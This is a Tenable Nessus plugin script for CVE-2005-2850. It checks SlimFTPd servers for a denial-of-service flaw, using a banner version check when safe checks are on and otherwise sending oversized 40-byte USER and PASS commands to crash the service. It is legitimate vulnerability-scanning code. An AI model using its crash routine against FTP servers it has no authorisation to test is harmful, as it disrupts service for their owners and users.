#
# (C) Tenable Network Security
#


 desc["english"] = "
Synopsis :

The remote FTP server is prone to a denial of service attack. 

Description :

The remote host appears to be using SlimFTPd, a free, small,
standards-compliant FTP server for Windows. 

The installed version of SlimFTPd on the remote host suffers from a
denial of service vulnerability.  By sending 'user' and 'pass'
commands that are each 40 bytes long, an attacker will crash the
service after about a short period of time. 

See also : 

http://www.critical.lt/?vuln/8

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:N)";


if (description) {
  script_id(19588);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2005-2850");
  script_bugtraq_id(14723);
  if (defined_func("script_xref")) script_xref(name:"OSVDB", value:"19143");
 
  name["english"] = "SlimFTPd Denial of Service Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple buffer overflow vulnerabilities in SlimFTPd < 3.17";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Denial of Service");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# If it looks like SlimFTPd...
banner = get_ftp_banner(port:port);
if (banner && "220-SlimFTPd" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    # There's a problem if the banner reports it's 3.17 or older.
    if (egrep(string:banner, pattern:"^220-SlimFTPd ([0-2]\.|3\.1[0-7][^0-9])")) {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Note that Nessus has determined the vulnerability exists on the\n",
        "remote host simply by looking at the version number of SlimFTPd\n",
        "installed there.\n"
      );
      security_note(port:port, data:report);
    }
    exit(0);
  }
  # Otherwise...
  else {
    # Try a couple of times to crash it.
    #
    # nb: the service seems to crash only when it hasn't received
    #     a connection for a while. Thus, if the target is an
    #     active server, the plugin probably won't pick up the
    #     flaw even though the exploit will eventually work.
    conns = 0;
    for (i=0; i < 3; i++) {
      soc = open_sock_tcp(port);
      if (soc) {
        conns++;
        s = ftp_recv_line(socket:soc);

        c = string("USER ", crap(40));
        send(socket:soc, data:string(c, "\r\n"));
        s = ftp_recv_line(socket:soc);

        if (s && '331 Need password for user "".' >< s) {
          c = string("PASS ", crap(40));
          send(socket:soc, data:string(c, "\r\n"));
          s = ftp_recv_line(socket:soc);
          if (s && "503 Bad sequence of commands. Send USER first." >< s) {
            close(soc);
            sleep(30);
          }
        }
      }
    }

    # If we sent at least one exploit, see if it's down now.
    if (conns) {
      soc = open_sock_tcp(port);
      if (soc) close(soc);
      else {
        security_note(port);
        exit(0);
      }
    }
  }
}
